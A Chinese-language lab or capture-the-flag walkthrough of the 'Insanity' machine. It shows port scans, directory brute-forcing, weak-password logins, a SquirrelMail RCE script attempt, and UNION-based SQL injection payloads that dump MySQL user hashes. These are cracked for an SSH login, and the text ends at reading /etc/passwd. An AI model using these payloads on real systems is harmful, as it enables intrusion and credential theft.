---
title: INSANITY
---

# 端口扫描
## 全端口扫描
~~~
┌──(kali㉿kali)-[~/insanity]
└─$ sudo nmap -sT -p- --min-rate 5000 192.168.2.139 -oA nmap/ports
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 03:06 EST
Nmap scan report for 192.168.2.139
Host is up (0.00046s latency).
Not shown: 65500 filtered tcp ports (no-response), 32 filtered tcp ports (host-unreach)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:42:5B:48 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds

~~~
## 默认脚本扫描

~~~
┌──(kali㉿kali)-[~/insanity]
└─$ sudo nmap -sT -sV -sC -O -p21,22,80 192.168.2.139 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 03:07 EST
Nmap scan report for 192.168.2.139
Host is up (0.00039s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.2.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:46:41:06:da:83:04:01:b0:e4:1f:9b:7e:8b:31:9f (RSA)
|   256 e4:9c:b1:f2:44:f1:f0:4b:c3:80:93:a9:5d:96:98:d3 (ECDSA)
|_  256 65:cf:b4:af:ad:86:56:ef:ae:8b:bf:f2:f0:d9:be:10 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/7.2.33)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.2.33
|_http-title: Insanity - UK and European Servers
MAC Address: 00:0C:29:42:5B:48 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|5.X|2.6.X (97%), Synology DiskStation Manager 5.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5.1 cpe:/o:linux:linux_kernel:2.6.32 cpe:/a:synology:diskstation_manager:5.2
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.2 - 4.9 (97%), Linux 5.1 (94%), Linux 3.16 - 4.6 (91%), Linux 4.10 (91%), Linux 2.6.32 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 - 5.8 (91%), Linux 5.0 - 5.4 (91%), Linux 2.6.32 - 3.10 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Unix

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds

~~~

## 漏洞脚本扫描

~~~
┌──(kali㉿kali)-[~/insanity]
└─$ sudo nmap -sT --script=vuln -p21,22,80 192.168.2.139 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 03:07 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 192.168.2.139
Host is up (0.00041s latency).

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-trace: TRACE is enabled
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|   /phpinfo.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|   /webmail/src/login.php: squirrelmail version 1.4.22
|   /webmail/images/sm_logo.png: SquirrelMail
|   /css/: Potentially interesting folder w/ directory listing
|   /data/: Potentially interesting folder w/ directory listing
|   /icons/: Potentially interesting folder w/ directory listing
|   /img/: Potentially interesting folder w/ directory listing
|   /js/: Potentially interesting folder w/ directory listing
|_  /news/: Potentially interesting folder
MAC Address: 00:0C:29:42:5B:48 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 54.95 seconds

~~~

## UDP扫描

~~~
┌──(kali㉿kali)-[~/insanity]
└─$ sudo nmap -sU --top-ports 20 192.168.2.139 -oA nmap/UDP 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-20 03:10 EST
Nmap scan report for 192.168.2.139
Host is up (0.00051s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    filtered      dhcps
68/udp    open|filtered dhcpc
69/udp    filtered      tftp
123/udp   filtered      ntp
135/udp   filtered      msrpc
137/udp   filtered      netbios-ns
138/udp   filtered      netbios-dgm
139/udp   filtered      netbios-ssn
161/udp   filtered      snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   filtered      route
631/udp   open|filtered ipp
1434/udp  filtered      ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp filtered      unknown
MAC Address: 00:0C:29:42:5B:48 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 8.10 seconds

~~~

# 21(FTP)
发现可以匿名登录
有一个文件夹pub
看起来是空的，也不能往里面传文件，暂时搁置
~~~
┌──(kali㉿kali)-[~/insanity]
└─$ ftp 192.168.2.139
Connected to 192.168.2.139.
220 (vsFTPd 3.0.2)
Name (192.168.2.139:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> binary
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||61800|).
ftp: Can't connect to `192.168.2.139:61800': No route to host
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Apr 01  2020 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -a
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0               6 Apr 01  2020 .
drwxr-xr-x    3 0        0              17 Aug 16  2020 ..
226 Directory send OK.
ftp> cd ..
250 Directory successfully changed.
ftp> ls -a
200 EPRT command successful. Consider using EPSV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0              17 Aug 16  2020 .
drwxr-xr-x    3 0        0              17 Aug 16  2020 ..
drwxr-xr-x    2 0        0               6 Apr 01  2020 pub
226 Directory send OK.

~~~

# 80(web)
有个邮箱地址`hello@insanityhosting.vm`，暂存
![](Pasted%20image%2020241120161338.png)
做一下目录爆破
~~~
┌──(kali㉿kali)-[~/insanity]
└─$ sudo gobuster dir -u "http://192.168.2.139" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.139
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/news                 (Status: 301) [Size: 234] [--> http://192.168.2.139/news/]
/img                  (Status: 301) [Size: 233] [--> http://192.168.2.139/img/]
/data                 (Status: 301) [Size: 234] [--> http://192.168.2.139/data/]
/css                  (Status: 301) [Size: 233] [--> http://192.168.2.139/css/]
/js                   (Status: 301) [Size: 232] [--> http://192.168.2.139/js/]
/webmail              (Status: 301) [Size: 237] [--> http://192.168.2.139/webmail/]
/fonts                (Status: 301) [Size: 235] [--> http://192.168.2.139/fonts/]
/monitoring           (Status: 301) [Size: 240] [--> http://192.168.2.139/monitoring/]
/licence              (Status: 200) [Size: 57]
/phpmyadmin           (Status: 301) [Size: 240] [--> http://192.168.2.139/phpmyadmin/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================

~~~

### news
一个介绍页，似乎是BluditCMS搭建的一个博客
![](Pasted%20image%2020241120162456.png)
### monitoring
一个登录页，没有其他的信息
![](Pasted%20image%2020241120162339.png)

### data

![](Pasted%20image%2020241120162728.png)
![](Pasted%20image%2020241120162747.png)

![](Pasted%20image%2020241120162759.png)

给了以一个版本号1.14.0，会是CMS的版本号吗
版本相差太大，大概率不是Bludit的版本号

![](Pasted%20image%2020241120163511.png)

### phpmyadmin
试一下弱口令登录
admin::admin和root::root都失败了，暂时放弃
![](Pasted%20image%2020241120161823.png)

### webmail
是一个Squirremail的服务，版本是1.4.22
![](Pasted%20image%2020241120161832.png)
寻找一下有没有公开漏洞，发现存在RCE
![](Pasted%20image%2020241120162012.png)

尝试利用发现需要认证

~~~
┌──(kali㉿kali)-[~/insanity]
└─$ bash 41910.sh http://192.168.2.139/webmail

     __                     __   __  __           __
    / /   ___  ____ _____ _/ /  / / / /___ ______/ /_____  __________
   / /   / _ \/ __ `/ __ `/ /  / /_/ / __ `/ ___/ //_/ _ \/ ___/ ___/
  / /___/  __/ /_/ / /_/ / /  / __  / /_/ / /__/ ,< /  __/ /  (__  )
 /_____/\___/\__, /\__,_/_/  /_/ /_/\__,_/\___/_/|_|\___/_/  /____/
           /____/

SquirrelMail <= 1.4.23 Remote Code Execution PoC Exploit (CVE-2017-7692)

SquirrelMail_RCE_exploit.sh (ver. 1.1)

Discovered and coded by

Dawid Golunski (@dawid_golunski)
https://legalhackers.com

ExploitBox project:
https://ExploitBox.io



[*] Enter SquirrelMail user credentials
user: hello@insanityhosting.vm
pass: 

[*] Logging in to SquirrelMail at http://192.168.2.139/webmail
Invalid creds

~~~

进一步搜集信息吧
文件扫描

~~~
┌──(kali㉿kali)-[~/insanity]
└─$ sudo gobuster dir -u "http://192.168.2.139" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x .txt,.php,.html
[sudo] password for kali: 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.139
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 207]
/index.php            (Status: 200) [Size: 31]
/index.html           (Status: 200) [Size: 22263]
/news                 (Status: 301) [Size: 234] [--> http://192.168.2.139/news/]
/img                  (Status: 301) [Size: 233] [--> http://192.168.2.139/img/]
/data                 (Status: 301) [Size: 234] [--> http://192.168.2.139/data/]
/css                  (Status: 301) [Size: 233] [--> http://192.168.2.139/css/]
/js                   (Status: 301) [Size: 232] [--> http://192.168.2.139/js/]
/webmail              (Status: 301) [Size: 237] [--> http://192.168.2.139/webmail/]
/fonts                (Status: 301) [Size: 235] [--> http://192.168.2.139/fonts/]
/monitoring           (Status: 301) [Size: 240] [--> http://192.168.2.139/monitoring/]
/licence              (Status: 200) [Size: 57]
/phpmyadmin           (Status: 301) [Size: 240] [--> http://192.168.2.139/phpmyadmin/]
/.html                (Status: 403) [Size: 207]
/phpinfo.php          (Status: 200) [Size: 85302]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
                                                                           
~~~

有之前没有发现的phpinfo.php
php的版本为7.2.33

![](Pasted%20image%2020241120163937.png)

再次访问news目录

![](Pasted%20image%2020241120164106.png)

这里被重定向了，试试更改域名

~~~
┌──(kali㉿kali)-[~/insanity]
└─$ sudo vim /etc/hosts                                                                                                           
┌──(kali㉿kali)-[~/insanity]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
192.168.2.139   insanityhosting.vm
192.168.2.139   www.insanityhosting.vm


~~~

再次访问news目录
![](Pasted%20image%2020241120165904.png)

news应该就是安装了cms的目录，另外还有一个用户名Otis

进行目录枚举

~~~
┌──(kali㉿kali)-[~/insanity]                                                       └─$ dirb http://www.insanityhosting.vm/news/                                                                                                                                                                                                             -----------------                                                                                                                                                                                                                                            
DIRB v2.22                                                                                                                                                                                                                                                   
By The Dark Raver                                                                                                                                                                                                                                            
-----------------                                                                                                                                                     START_TIME: Wed Nov 20 05:35:49 2024                                                                                                                                                                                                                         
URL_BASE: http://www.insanityhosting.vm/news/                                                                                                                                                                                                                
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                                                                                                                                                         
-----------------                                                                                                                                                                                                                                        GENERATED WORDS: 4612                                                                                                                                                                                                                                    ---- Scanning URL: http://www.insanityhosting.vm/news/ ----                                                                                                           + http://www.insanityhosting.vm/news/0 (CODE:200|SIZE:5111)                                                                                                           ==> DIRECTORY: http://www.insanityhosting.vm/news/admin/                                                                                                              + http://www.insanityhosting.vm/news/cgi-bin/ (CODE:301|SIZE:0)                                                                                                       + http://www.insanityhosting.vm/news/LICENSE (CODE:200|SIZE:1083)                                                                                                     + http://www.insanityhosting.vm/news/robots.txt (CODE:200|SIZE:22)                                                                                                    + http://www.insanityhosting.vm/news/welcome (CODE:200|SIZE:4514)                                                                                                                                                                                        ---- Entering directory: http://www.insanityhosting.vm/news/admin/ ----
+ http://www.insanityhosting.vm/news/admin/ajax (CODE:401|SIZE:0)                                                                                                                                                                                        -----------------
END_TIME: Wed Nov 20 05:37:35 2024
DOWNLOADED: 9224 - FOUND: 6


~~~

访问之后都没有什么新的发现，整理一下现在有的信息，回过头去看看
可能的用户名

~~~
Otis
otis
admin
hello
insanity
~~~

phpmyadmin用Otis和空密码登录进去了.......

![](Pasted%20image%2020241120203102.png)

还有monitoring使用otis::123456也成功登录

这组凭据也可以登录到webmail！

![](Pasted%20image%2020241120210432.png)

但是尝试了RCE的利用脚本全都失败

之前monitoring说发现主机下线了会发邮件，会是通过这个发送吗

搞一台不存在的主机

![](Pasted%20image%2020241121115424.png)

发现确实会通过这里发邮件

![](Pasted%20image%2020241121115357.png)

![](Pasted%20image%2020241121115513.png)

实在没有什么想法了，试一下有没有sql注入

试了无数组payload，主机的名称确实存在sql注入，爆字段吧

~~~
" union select 1,2,table_name,table_schema from  information_schema.tables; is down.
Please check the report below for more information.

ID, Host, Date Time, Status
1,2,CHARACTER_SETS,information_schema
1,2,CLIENT_STATISTICS,information_schema
1,2,COLLATIONS,information_schema
1,2,COLLATION_CHARACTER_SET_APPLICABILITY,information_schema
1,2,COLUMNS,information_schema
1,2,COLUMN_PRIVILEGES,information_schema
1,2,ENGINES,information_schema
1,2,EVENTS,information_schema
1,2,FILES,information_schema
1,2,GLOBAL_STATUS,information_schema
1,2,GLOBAL_VARIABLES,information_schema
1,2,INDEX_STATISTICS,information_schema
1,2,KEY_CACHES,information_schema
1,2,KEY_COLUMN_USAGE,information_schema
1,2,PARAMETERS,information_schema
1,2,PARTITIONS,information_schema
1,2,PLUGINS,information_schema
1,2,PROCESSLIST,information_schema
1,2,PROFILING,information_schema
1,2,REFERENTIAL_CONSTRAINTS,information_schema
1,2,ROUTINES,information_schema
1,2,SCHEMATA,information_schema
1,2,SCHEMA_PRIVILEGES,information_schema
1,2,SESSION_STATUS,information_schema
1,2,SESSION_VARIABLES,information_schema
1,2,STATISTICS,information_schema
1,2,TABLES,information_schema
1,2,TABLESPACES,information_schema
1,2,TABLE_CONSTRAINTS,information_schema
1,2,TABLE_PRIVILEGES,information_schema
1,2,TABLE_STATISTICS,information_schema
1,2,TRIGGERS,information_schema
1,2,USER_PRIVILEGES,information_schema
1,2,USER_STATISTICS,information_schema
1,2,VIEWS,information_schema
1,2,INNODB_CMPMEM_RESET,information_schema
1,2,INNODB_RSEG,information_schema
1,2,INNODB_UNDO_LOGS,information_schema
1,2,INNODB_CMPMEM,information_schema
1,2,INNODB_SYS_TABLESTATS,information_schema
1,2,INNODB_LOCK_WAITS,information_schema
1,2,INNODB_INDEX_STATS,information_schema
1,2,INNODB_CMP,information_schema
1,2,INNODB_CMP_RESET,information_schema
1,2,INNODB_CHANGED_PAGES,information_schema
1,2,INNODB_BUFFER_POOL_PAGES,information_schema
1,2,INNODB_TRX,information_schema
1,2,INNODB_BUFFER_POOL_PAGES_INDEX,information_schema
1,2,INNODB_LOCKS,information_schema
1,2,INNODB_BUFFER_POOL_PAGES_BLOB,information_schema
1,2,INNODB_SYS_TABLES,information_schema
1,2,INNODB_SYS_FIELDS,information_schema
1,2,INNODB_SYS_COLUMNS,information_schema
1,2,INNODB_SYS_STATS,information_schema
1,2,INNODB_SYS_FOREIGN,information_schema
1,2,INNODB_SYS_INDEXES,information_schema
1,2,XTRADB_ADMIN_COMMAND,information_schema
1,2,INNODB_TABLE_STATS,information_schema
1,2,INNODB_SYS_FOREIGN_COLS,information_schema
1,2,INNODB_BUFFER_PAGE_LRU,information_schema
1,2,INNODB_BUFFER_POOL_STATS,information_schema
1,2,INNODB_BUFFER_PAGE,information_schema
1,2,hosts,monitoring
1,2,log,monitoring
1,2,users,monitoring
1,2,columns_priv,mysql
1,2,db,mysql
1,2,event,mysql
1,2,func,mysql
1,2,general_log,mysql
1,2,help_category,mysql
1,2,help_keyword,mysql
1,2,help_relation,mysql
1,2,help_topic,mysql
1,2,host,mysql
1,2,ndb_binlog_index,mysql
1,2,plugin,mysql
1,2,proc,mysql
1,2,procs_priv,mysql
1,2,proxies_priv,mysql
1,2,servers,mysql
1,2,slow_log,mysql
1,2,tables_priv,mysql
1,2,time_zone,mysql
1,2,time_zone_leap_second,mysql
1,2,time_zone_name,mysql
1,2,time_zone_transition,mysql
1,2,time_zone_transition_type,mysql
1,2,user,mysql
1,2,cond_instances,performance_schema
1,2,events_waits_current,performance_schema
1,2,events_waits_history,performance_schema
1,2,events_waits_history_long,performance_schema
1,2,events_waits_summary_by_instance,performance_schema
1,2,events_waits_summary_by_thread_by_event_name,performance_schema
1,2,events_waits_summary_global_by_event_name,performance_schema
1,2,file_instances,performance_schema
1,2,file_summary_by_event_name,performance_schema
1,2,file_summary_by_instance,performance_schema
1,2,mutex_instances,performance_schema
1,2,performance_timers,performance_schema
1,2,rwlock_instances,performance_schema
1,2,setup_consumers,performance_schema
1,2,setup_instruments,performance_schema
1,2,setup_timers,performance_schema
1,2,threads,performance_schema
~~~

~~~
test" UNION SELECT 1, user, password, authentication_string FROM mysql.user; # is
down. Please check the report below for more information.

ID, Host, Date Time, Status
298,test,"2024-11-20 12:48:01",1
300,test,"2024-11-20 12:49:01",1
303,test,"2024-11-20 12:50:01",1
306,test,"2024-11-20 12:51:02",1
309,test,"2024-11-20 12:52:01",1
312,test,"2024-11-20 12:53:01",1
315,test,"2024-11-20 12:54:01",1
318,test,"2024-11-20 12:55:01",1
321,test,"2024-11-20 12:56:01",1
324,test,"2024-11-20 12:57:01",1
327,test,"2024-11-20 12:58:01",1
330,test,"2024-11-20 12:59:01",1
333,test,"2024-11-20 13:00:01",1
336,test,"2024-11-20 13:01:01",1
339,test,"2024-11-20 13:02:01",1
342,test,"2024-11-20 13:03:01",1
345,test,"2024-11-20 13:04:01",1
348,test,"2024-11-20 13:05:01",1
351,test,"2024-11-20 13:06:01",1
354,test,"2024-11-20 13:07:01",1
357,test,"2024-11-20 13:08:01",1
360,test,"2024-11-20 13:09:01",1
363,test,"2024-11-20 13:10:01",1
366,test,"2024-11-20 13:11:02",1
369,test,"2024-11-20 13:12:01",1
372,test,"2024-11-20 13:13:01",1
375,test,"2024-11-20 13:14:01",1
378,test,"2024-11-20 13:15:01",1
381,test,"2024-11-20 13:16:01",1
383,test,"2024-11-20 13:17:01",1
385,test,"2024-11-20 13:18:01",1
387,test,"2024-11-20 13:19:01",1
389,test,"2024-11-20 13:20:01",1
391,test,"2024-11-20 13:21:01",1
393,test,"2024-11-20 13:22:01",1
395,test,"2024-11-20 13:23:01",1
397,test,"2024-11-20 13:24:02",1
399,test,"2024-11-20 13:25:01",1
401,test,"2024-11-20 13:26:01",1
403,test,"2024-11-20 13:27:01",1
405,test,"2024-11-20 13:28:01",1
407,test,"2024-11-20 13:29:01",1
409,test,"2024-11-20 13:30:02",1
411,test,"2024-11-20 13:31:01",1
413,test,"2024-11-20 13:32:01",1
415,test,"2024-11-20 13:33:01",1
417,test,"2024-11-20 13:34:01",1
419,test,"2024-11-20 13:35:01",1
421,test,"2024-11-20 13:36:01",1
423,test,"2024-11-20 13:37:02",1
425,test,"2024-11-20 13:38:01",1
427,test,"2024-11-20 13:39:01",1
429,test,"2024-11-20 13:40:01",1
431,test,"2024-11-20 13:41:01",1
433,test,"2024-11-20 13:42:01",1
435,test,"2024-11-20 13:43:01",1
437,test,"2024-11-20 13:44:01",1
439,test,"2024-11-20 13:45:01",1
441,test,"2024-11-20 13:46:01",1
443,test,"2024-11-20 13:47:01",1
445,test,"2024-11-20 13:48:01",1
447,test,"2024-11-20 13:49:01",1
449,test,"2024-11-20 13:50:02",1
451,test,"2024-11-20 13:51:01",1
453,test,"2024-11-20 13:52:01",1
455,test,"2024-11-20 13:53:01",1
457,test,"2024-11-20 13:54:01",1
459,test,"2024-11-20 13:55:01",1
461,test,"2024-11-20 13:56:01",1
463,test,"2024-11-20 13:57:01",1
465,test,"2024-11-20 13:58:01",1
467,test,"2024-11-20 13:59:01",1
469,test,"2024-11-20 14:00:01",1
471,test,"2024-11-20 14:01:02",1
473,test,"2024-11-20 14:02:01",1
475,test,"2024-11-20 14:03:01",1
477,test,"2024-11-20 14:04:01",1
479,test,"2024-11-20 14:05:01",1
481,test,"2024-11-20 14:06:01",1
483,test,"2024-11-20 14:07:02",1
485,test,"2024-11-20 14:08:01",1
487,test,"2024-11-20 14:09:01",1
489,test,"2024-11-20 14:10:01",1
491,test,"2024-11-20 14:11:01",1
493,test,"2024-11-20 14:12:02",1
495,test,"2024-11-20 14:13:01",1
497,test,"2024-11-20 14:14:01",1
499,test,"2024-11-20 14:15:01",1
501,test,"2024-11-20 14:16:01",1
503,test,"2024-11-20 14:17:01",1
505,test,"2024-11-20 14:18:01",1
507,test,"2024-11-20 14:19:01",1
509,test,"2024-11-20 14:20:01",1
511,test,"2024-11-20 14:21:01",1
513,test,"2024-11-20 14:22:01",1
515,test,"2024-11-20 14:23:01",1
517,test,"2024-11-20 14:24:02",1
519,test,"2024-11-20 14:25:01",1
521,test,"2024-11-20 14:26:01",1
523,test,"2024-11-20 14:27:01",1
525,test,"2024-11-20 14:28:01",1
527,test,"2024-11-20 14:29:01",1
529,test,"2024-11-20 14:30:01",1
531,test,"2024-11-20 14:31:02",1
533,test,"2024-11-20 14:32:01",1
535,test,"2024-11-20 14:33:01",1
537,test,"2024-11-20 14:34:01",1
539,test,"2024-11-20 14:35:01",1
541,test,"2024-11-20 14:36:01",1
543,test,"2024-11-20 14:37:01",1
545,test,"2024-11-20 14:38:01",1
547,test,"2024-11-20 14:39:01",1
549,test,"2024-11-20 14:40:02",1
551,test,"2024-11-20 14:41:01",1
553,test,"2024-11-20 14:42:01",1
555,test,"2024-11-20 14:43:01",1
557,test,"2024-11-20 14:44:01",1
559,test,"2024-11-20 14:45:01",1
561,test,"2024-11-20 14:46:01",1
563,test,"2024-11-20 14:47:01",1
565,test,"2024-11-20 14:48:02",1
567,test,"2024-11-20 14:49:01",1
569,test,"2024-11-20 14:50:01",1
571,test,"2024-11-20 14:51:01",1
573,test,"2024-11-20 14:52:01",1
575,test,"2024-11-20 14:53:01",1
577,test,"2024-11-20 14:54:01",1
579,test,"2024-11-20 14:55:01",1
581,test,"2024-11-20 14:56:01",1
583,test,"2024-11-20 14:57:01",1
585,test,"2024-11-20 14:58:01",1
587,test,"2024-11-20 14:59:01",1
589,test,"2024-11-20 15:00:01",1
591,test,"2024-11-20 15:01:01",1
593,test,"2024-11-20 15:02:01",1
595,test,"2024-11-20 15:03:02",1
597,test,"2024-11-20 15:04:01",1
599,test,"2024-11-20 15:05:01",1
601,test,"2024-11-20 15:06:01",1
603,test,"2024-11-20 15:07:01",1
605,test,"2024-11-20 15:08:01",1
607,test,"2024-11-20 15:09:01",1
609,test,"2024-11-20 15:10:01",1
611,test,"2024-11-20 15:11:02",1
613,test,"2024-11-20 15:12:01",1
615,test,"2024-11-20 15:13:01",1
617,test,"2024-11-20 15:14:01",1
619,test,"2024-11-20 15:15:01",1
621,test,"2024-11-20 15:16:01",1
623,test,"2024-11-20 15:17:01",1
625,test,"2024-11-20 15:18:01",1
627,test,"2024-11-20 15:19:01",1
629,test,"2024-11-20 15:20:01",1
631,test,"2024-11-20 15:21:01",1
633,test,"2024-11-20 15:22:01",1
635,test,"2024-11-20 15:23:01",1
637,test,"2024-11-20 15:24:01",1
639,test,"2024-11-20 15:25:01",1
641,test,"2024-11-20 15:26:01",1
643,test,"2024-11-20 15:27:01",1
645,test,"2024-11-20 15:28:01",1
647,test,"2024-11-20 15:29:01",1
649,test,"2024-11-20 15:30:01",1
651,test,"2024-11-20 15:31:01",1
653,test,"2024-11-20 15:32:01",1
655,test,"2024-11-20 15:33:01",1
657,test,"2024-11-20 15:34:01",1
659,test,"2024-11-20 15:35:01",1
661,test,"2024-11-20 15:36:01",1
663,test,"2024-11-20 15:37:01",1
665,test,"2024-11-20 15:38:01",1
667,test,"2024-11-20 15:39:01",1
669,test,"2024-11-20 15:40:02",1
671,test,"2024-11-20 15:41:01",1
673,test,"2024-11-20 15:42:01",1
675,test,"2024-11-20 15:43:01",1
678,test,"2024-11-20 15:44:01",1
681,test,"2024-11-20 15:45:01",1
684,test,"2024-11-20 15:46:01",1
687,test,"2024-11-20 15:47:01",1
690,test,"2024-11-20 15:48:01",1
693,test,"2024-11-20 15:49:02",1
696,test,"2024-11-20 15:50:01",1
699,test,"2024-11-20 15:51:01",1
703,test,"2024-11-20 15:52:01",1
1,root,*CDA244FF510B063DA17DFF84FF39BA0849F7920F,
1,,,
1,elliot,,*5A5749F309CAC33B27BA94EE02168FA3C3E7A3E9
~~~

识别一下hash
~~~
┌──(kali㉿kali)-[~/insanity]
└─$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: CDA244FF510B063DA17DFF84FF39BA0849F7920F

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))

Least Possible Hashs:
[+] Tiger-160
[+] Haval-160
[+] RipeMD-160
[+] SHA-1(HMAC)
[+] Tiger-160(HMAC)
[+] RipeMD-160(HMAC)
[+] Haval-160(HMAC)
[+] SHA-1(MaNGOS)
[+] SHA-1(MaNGOS2)
[+] sha1($pass.$salt)
[+] sha1($salt.$pass)
[+] sha1($salt.md5($pass))
[+] sha1($salt.md5($pass).$salt)
[+] sha1($salt.sha1($pass))
[+] sha1($salt.sha1($salt.sha1($pass)))
[+] sha1($username.$pass)
[+] sha1($username.$pass.$salt)
[+] sha1(md5($pass))
[+] sha1(md5($pass).$salt)
[+] sha1(md5(sha1($pass)))
[+] sha1(sha1($pass))
[+] sha1(sha1($pass).$salt)
[+] sha1(sha1($pass).substr($pass,0,3))
[+] sha1(sha1($salt.$pass))
[+] sha1(sha1(sha1($pass)))
[+] sha1(strtolower($username).$pass)
--------------------------------------------------
 HASH: ^C

        Bye!

~~~

应该是SHA1

找个在线网站解密

root的密码未查到，但是查到了elliot的密码elliot123

![](Pasted%20image%2020241121132857.png)

试一下ssh登录，成功登录

~~~

┌──(kali㉿kali)-[~/insanity]
└─$ ssh elliot@192.168.2.139 
elliot@192.168.2.139's password: 
Last login: Wed Aug 31 10:00:29 1994 from YIWf3H2/d`/%pRveZR

\f]1*
     l#
[elliot@insanityhosting ~]$   ~~~

~~~

查看passwd

~~~
[elliot@insanityhosting home]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
